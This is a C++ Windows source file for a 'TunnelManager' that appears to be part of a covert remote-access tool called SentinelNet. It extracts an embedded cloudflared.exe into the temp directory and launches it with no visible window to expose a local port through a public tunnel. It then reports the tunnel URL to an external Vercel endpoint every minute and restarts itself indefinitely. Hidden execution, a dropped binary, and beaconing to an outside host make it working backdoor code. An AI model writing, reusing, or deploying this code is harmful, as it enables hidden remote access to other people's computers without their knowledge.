#include "tunnel.h"
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <winhttp.h>
#include <fstream>
#include <string>
#include <vector>
#pragma comment(lib, "winhttp.lib")

#define VERCEL_HOST "sentinelnet-v2.vercel.app"
#define REPORT_PATH "/api/report"


static void httpsPost(const std::string &host, const std::string &path, const std::string &body) {
    HINTERNET hSession = WinHttpOpen(L"SentinelNet/2.0",
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) return;

    HINTERNET hConnect = WinHttpConnect(hSession,
        std::wstring(host.begin(), host.end()).c_str(), INTERNET_DEFAULT_HTTPS_PORT, 0);
    if (!hConnect) { WinHttpCloseHandle(hSession); return; }

    std::wstring wPath(path.begin(), path.end());
    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", wPath.c_str(),
        nullptr, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
    if (!hRequest) { WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); return; }

    std::wstring wHeaders(L"Content-Type: application/json\r\n");
    WinHttpAddRequestHeaders(hRequest, wHeaders.c_str(), -1L, WINHTTP_ADDREQ_FLAG_ADD);

    WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
        (LPVOID)body.c_str(), body.size(), body.size(), 0);
    WinHttpReceiveResponse(hRequest, nullptr);

    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
}


static void reportURL(const std::string &url) {
    std::string body = "{\"url\":\"" + url + "\"}";
    httpsPost(VERCEL_HOST, REPORT_PATH, body);
}


#define CLOUDFLARED_EXE 101

static std::string extractCloudflared() {
    char tempDir[MAX_PATH];
    GetTempPathA(MAX_PATH, tempDir);
    std::string outPath = std::string(tempDir) + "cloudflared.exe";

    if (GetFileAttributesA(outPath.c_str()) != INVALID_FILE_ATTRIBUTES)
        return outPath;

    HMODULE hModule = GetModuleHandleA(nullptr);
    HRSRC hRes = FindResourceA(hModule, MAKEINTRESOURCEA(CLOUDFLARED_EXE), RT_RCDATA);
    if (!hRes) return "";

    HGLOBAL hGlobal = LoadResource(hModule, hRes);
    if (!hGlobal) return "";

    DWORD size = SizeofResource(hModule, hRes);
    void* data = LockResource(hGlobal);
    if (!data || size == 0) return "";

    std::ofstream f(outPath, std::ios::binary);
    if (!f.is_open()) return "";
    f.write(static_cast<char*>(data), size);
    f.close();

    return outPath;
}

void TunnelManager::start() {
    while (true) {
        std::string cloudflaredPath = extractCloudflared();
        if (cloudflaredPath.empty()) {
            Sleep(10000);
            continue;
        }

        HANDLE hReadPipe, hWritePipe;
        SECURITY_ATTRIBUTES sa = { sizeof(sa), nullptr, TRUE };
        if (!CreatePipe(&hReadPipe, &hWritePipe, &sa, 0)) {
            Sleep(5000);
            continue;
        }
        SetHandleInformation(hReadPipe, HANDLE_FLAG_INHERIT, 0);

        std::string cmd = "\"" + cloudflaredPath + "\" tunnel --url localhost:8080 --no-autoupdate";

        char tempDir[MAX_PATH];
        GetTempPathA(MAX_PATH, tempDir);

        STARTUPINFOA si = { sizeof(si) };
        si.dwFlags    = STARTF_USESTDHANDLES;
        si.hStdOutput = hWritePipe;
        si.hStdError  = hWritePipe;
        PROCESS_INFORMATION pi = {};

        BOOL ok = CreateProcessA(nullptr, const_cast<char*>(cmd.c_str()),
            nullptr, nullptr, TRUE, CREATE_NO_WINDOW, nullptr, tempDir, &si, &pi);
        CloseHandle(hWritePipe);

        if (!ok) { 
            CloseHandle(hReadPipe); 
            Sleep(5000);
            continue; 
        }

        std::string url;
        std::string buffer;
        char ch;
        DWORD read;

        auto deadline = GetTickCount64() + 30000;
        bool found = false;
        while (GetTickCount64() < deadline) {
            DWORD avail = 0;
            if (PeekNamedPipe(hReadPipe, nullptr, 0, nullptr, &avail, nullptr) && avail > 0) {
                if (ReadFile(hReadPipe, &ch, 1, &read, nullptr) && read > 0) {
                    buffer += ch;
                    size_t pos = buffer.find("trycloudflare.com");
                    if (pos != std::string::npos) {
                        size_t start = buffer.rfind("https://", pos);
                        if (start != std::string::npos) {
                            size_t end = buffer.find_first_of(" \t\r\n", pos);
                            url = buffer.substr(start, end - start);
                            found = true;
                            break;
                        }
                    }
                }
            } else {
                if (WaitForSingleObject(pi.hProcess, 0) == WAIT_OBJECT_0) {
                    break;
                }
                Sleep(100);
            }
        }

        if (found && !url.empty()) {
            // Heartbeat loop: periodically push the URL as long as cloudflared runs
            reportURL(url);
            while (WaitForSingleObject(pi.hProcess, 60000) == WAIT_TIMEOUT) {
                reportURL(url); 
            }
        }

        // Cleanup and restart loop
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(hReadPipe);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        
        reportURL("offline");
        Sleep(10000); // Wait 10s before restarting tunnel sequence
    }
}